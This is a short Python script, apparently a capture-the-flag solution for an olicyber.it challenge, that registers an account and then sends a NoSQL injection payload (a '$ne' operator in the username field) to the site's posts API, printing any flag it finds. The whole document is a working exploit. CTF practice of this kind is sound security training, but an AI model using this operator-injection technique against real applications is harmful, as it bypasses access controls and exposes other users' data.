import requests

data = {'username':'ciaoeaddio','password': 'addioeciao'}
url = 'http://gabibbo_kontakte.challs.olicyber.it'

# Register
s = requests.Session()

r = s.post(f'{url}/register', json=data)

#noSQL injection
r = s.post(f'{url}/api/posts', json={
    'username':{
        '$ne':''
    }
}).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)